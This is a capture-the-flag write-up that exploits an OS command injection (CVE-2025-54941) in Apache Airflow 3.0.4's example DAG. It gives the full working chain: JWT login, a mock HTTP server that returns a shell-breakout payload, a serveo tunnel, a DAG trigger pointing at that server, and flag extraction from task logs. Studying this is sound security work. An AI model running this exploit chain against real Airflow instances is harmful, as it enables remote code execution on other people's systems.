# nday1

| Field       | Value                          |
|-------------|--------------------------------|
| Platform    | UNbreakable 2026               |
| Category    | web                            |
| Difficulty  | Medium                         |
| CVE         | CVE-2025-54941                 |

## Description
> Go ahead hacker, do your best. admin/admin

Service: `http://35.198.121.234:30726`

## TL;DR
CVE-2025-54941: OS Command Injection in `example_dag_decorator` of Apache Airflow 3.0.0-3.0.4. The DAG's `url` parameter is not validated and the response JSON's `origin` field is interpolated without sanitization into a BashOperator, allowing RCE on the worker.

## Initial analysis

### Service reconnaissance

```bash
$ curl -s http://35.198.121.234:30726/api/v2/version
{"version":"3.0.4","git_version":".dev0+367d8680af355b492f256ab86aa738f9ee292f2f.dirty"}
```

Airflow 3.0.4 with React web interface (SPA) and REST API v2 on FastAPI/uvicorn.

### Authentication

Airflow 3.0's v2 API uses JWT (not Basic Auth):

```bash
$ curl -s -X POST http://35.198.121.234:30726/auth/token \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}'
{"access_token":"eyJhbGciOiJIUzUxMiIs...","token_type":"bearer"}
```

JWT token signed with HS512, payload: `{"sub":"1","aud":"apache-airflow"}`.

### API enumeration

```bash
# Explored endpoints (with JWT):
GET /api/v2/dags              # 200 - 70+ DAGs (example DAGs enabled)
GET /api/v2/version           # 200 - Airflow 3.0.4
GET /api/v2/connections       # 200 - empty
GET /api/v2/variables         # 200
GET /api/v2/plugins           # 200 - MetadataCollectionPlugin + 2 more
GET /api/v2/providers         # 200 - celery, postgres, redis, smtp, standard, fab
GET /api/v2/config            # 403 - "administrator chose not to expose"
POST /api/v2/connections/test # 422 - "Testing connections is disabled"
GET /api/v2/dagSources/{id}   # 404 - "source code not found"
```

Key findings:
- Example DAGs enabled in production (security anti-pattern)
- Connection testing disabled
- Configuration not exposed (cannot read `secret_key`)
- Providers: postgres, celery, redis, smtp, standard, fab

### DAG enumeration

```bash
$ curl -s http://35.198.121.234:30726/api/v2/dags?limit=100 \
  -H "Authorization: Bearer $TOKEN" | python3 -c '
import sys,json
[print(d["dag_id"]) for d in json.load(sys.stdin)["dags"]]'
```

70+ DAGs available including all Airflow example DAGs.

### Attempt 1: Injection via dag_run.conf in BashOperator

Triggered `example_bash_operator` with `conf={"bash_command":"cat /flag*"}`. The DAG ran successfully, but the tasks use hardcoded commands (`echo "{{ ds }}"`) — `conf` is not consumed.

### Attempt 2: Template rendering in example_passing_params_via_test_command

The task `also_run_this` renders `{{ params.foo }}` and `{{ params.miff }}` as environment variables. However, scheduled runs failed with `UndefinedError: 'dict object' has no attribute 'foo'` and the BashOperator runs a hardcoded command, not controllable.

### Attempt 3: Forge file_token to read sources

The `file_token` uses `itsdangerous.URLSafeTimedSerializer`. Without knowing the `secret_key` (config not exposed), it cannot be forged. Brute force with common keys failed.

## Identified vulnerability

### CVE-2025-54941 — OS Command Injection in example_dag_decorator

**Affected versions:** Apache Airflow 3.0.0 to 3.0.4 (fixed in 3.0.5)
**CWE:** CWE-78 (OS Command Injection)
**CVSS:** 4.6 (Medium) — in real-world context; in a CTF with example DAGs enabled it is critical.

Vulnerable source (`example_dag_decorator.py` from Airflow 3.0.4):

```python
@dag(schedule=None, start_date=pendulum.datetime(2021, 1, 1, tz="UTC"), catchup=False)
def example_dag_decorator(url: str = "http://httpbin.org/get"):
    get_ip = GetRequestOperator(task_id="get_ip", url=url)

    @task(multiple_outputs=True)
    def prepare_command(raw_json: dict[str, Any]) -> dict[str, str]:
        external_ip = raw_json["origin"]
        return {
            "command": f"echo 'Seems like today your server executing Airflow "
                       f"is connected from IP {external_ip}'",   # <-- INJECTION
        }

    command_info = prepare_command(get_ip.output)
    BashOperator(task_id="echo_ip_info", bash_command=command_info["command"])
```

Line 65: `{external_ip}` is interpolated directly into an f-string that builds a bash command. The value comes from `raw_json["origin"]`, which is the JSON response from the user-provided URL. There is no sanitization.

**Data flow:**
1. `url` (DAG parameter, overrideable via `conf`) -> `GetRequestOperator` makes GET request
2. Response JSON `["origin"]` -> `prepare_command` interpolates it into an f-string
3. f-string -> `BashOperator.bash_command` -> executed in shell

**Attack vector:**
1. Deploy an HTTP server that returns `{"origin": "'; cat /flag* ; echo '"}`
2. Trigger the DAG with `conf={"url":"http://my-server/"}` to override the parameter
3. The BashOperator executes: `echo 'Seems like...IP '; cat /flag* ; echo ''`
4. The output (with the flag) appears in the task logs

## Solution process

### Step 1: Obtain JWT

```bash
TOKEN=$(curl -s -X POST 'http://35.198.121.234:30726/auth/token' \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}' | python3 -c \
  'import sys,json; print(json.load(sys.stdin)["access_token"])')
```

### Step 2: Identify the vulnerable DAG

```bash
$ curl -s "http://35.198.121.234:30726/api/v2/dags/example_dag_decorator/tasks" \
  -H "Authorization: Bearer $TOKEN" | python3 -c '
import sys,json
for t in json.load(sys.stdin)["tasks"]:
    print(t["task_id"], t["operator_name"], t.get("params",{}).get("url",{}).get("value",""))'
```
```
echo_ip_info BashOperator http://httpbin.org/get
get_ip GetRequestOperator http://httpbin.org/get
prepare_command @task http://httpbin.org/get
```

All three tasks have `params.url = "http://httpbin.org/get"` — the DAG parameter.

### Step 3: Obtain the DAG source code

```bash
$ pip3 install apache-airflow==3.0.4 --target=/tmp/af_install
$ cat /tmp/af_install/airflow/example_dags/example_dag_decorator.py
```

Confirms the injection at line 65 of the unsanitized f-string.

### Step 4: Deploy malicious server

```python
# mock_server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Payload that breaks out of the single quotes and executes cat /flag*
        payload = json.dumps({"origin": "'; cat /flag* ; echo '"})
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(payload.encode())

HTTPServer(("0.0.0.0", 9999), Handler).serve_forever()
```

The BashOperator will execute:
```bash
echo 'Seems like today your server executing Airflow is connected from IP '; cat /flag* ; echo ''
```

### Step 5: Expose the server via tunnel

```bash
$ python3 mock_server.py &
$ ssh -o StrictHostKeyChecking=no -R 80:localhost:9999 serveo.net
Forwarding HTTP traffic from https://18eb4d0988097825-83-54-247-154.serveousercontent.com
```

Verification:
```bash
$ curl -s https://18eb4d0988097825-83-54-247-154.serveousercontent.com/
{"origin": "'; cat /flag* ; echo '"}
```

### Step 6: Trigger the DAG with malicious URL

```bash
$ curl -s -X POST "http://35.198.121.234:30726/api/v2/dags/example_dag_decorator/dagRuns" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "logical_date": "2026-03-04T12:00:00Z",
    "conf": {"url": "https://18eb4d0988097825-83-54-247-154.serveousercontent.com/"}
  }'
```

Important note: `logical_date` must be in the past so that `run_after` is in the past and the scheduler executes it immediately. A future logical_date causes the run to stay in `queued` state until that time.

### Step 7: Verify execution

```bash
$ curl -s "http://35.198.121.234:30726/api/v2/dags/example_dag_decorator/dagRuns/manual__2026-03-06T16:47:43.345298+00:00" \
  -H "Authorization: Bearer $TOKEN" | python3 -c '
import sys,json; d=json.load(sys.stdin); print(d["state"])'
success
```

### Step 8: Read the flag from the logs

```bash
$ curl -s "http://35.198.121.234:30726/api/v2/dags/example_dag_decorator/dagRuns/manual__2026-03-06T16:47:43.345298+00:00/taskInstances/echo_ip_info/logs/1" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" | python3 -c '
import sys,json
for e in json.load(sys.stdin)["content"]:
    if isinstance(e, dict): print(e.get("event",""))'
```

Relevant output:
```
Running command: ['/usr/bin/bash', 'tmpitnr3omi.sh']
Output:
Seems like today your server executing Airflow is connected from IP
CTF{2539590147b12b33dfd9d0bc65c86aec525af4d4dd9c997258d57b09c9adf16d}
Command exited with return code 0
```

## Discarded approaches

1. **dag_run.conf injection in example_bash_operator**: Tasks use hardcoded commands, they don't consume `conf`.
2. **Template injection via params in example_passing_params_via_test_command**: The task `also_run_this` fails with `UndefinedError` and the bash_command is not controllable via conf.
3. **file_token forgery to read DAG sources**: Without the `secret_key`, the signed token with itsdangerous cannot be forged.
4. **Brute force of secret_key**: Common keys tested (`temporary_key`, `airflow`, etc.) with multiple salts — none worked.
5. **Connection testing**: Disabled on the instance (`testing connections is disabled`).
6. **Config endpoint**: Returns 403, configuration cannot be read.
7. **Direct URL injection** (`http://httpbin.org/get; cat /flag*`): httpx does not parse this as a valid URL — the injection must be in the server's RESPONSE, not in the URL.

## Final exploit

See `solve.py` — automates the entire flow: JWT authentication, mock server, tunnel via serveo, DAG trigger, wait, and flag extraction from the logs.

## Execution

```bash
python3 solve.py --remote
```

Requires outbound SSH access for the serveo.net tunnel.

## Flag

```
CTF{2539590147b12b33dfd9d0bc65c86aec525af4d4dd9c997258d57b09c9adf16d}
```

## Key Lessons

- **Example DAGs are dangerous in production**: CVE-2025-54941 exists because example_dags is enabled. Airflow warns about this in its documentation but many deployments ignore it.
- **f-strings + BashOperator = RCE**: Never interpolate untrusted input into bash commands. Airflow should use `shlex.quote()` or pass arguments via the BashOperator's `env`.
- **DAG params are overrideable via conf**: In Airflow 3.0, `dag_run.conf` can override DAG decorator parameters. This amplifies the impact of any insecure parameter.
- **logical_date matters**: A future `logical_date` causes the scheduler to not execute the run until that time. Always use a past date for immediate execution.
- **Airflow logs reveal output**: BashOperator output goes to the task logs, accessible via API. No reverse shell is needed — just read the logs.

## References

- [CVE-2025-54941 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-54941)
- [Apache Airflow REST API v2](https://airflow.apache.org/docs/apache-airflow/stable/stable-rest-api-ref.html)
- [Airflow example_dag_decorator.py source](https://github.com/apache/airflow/blob/3.0.4/airflow/example_dags/example_dag_decorator.py)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
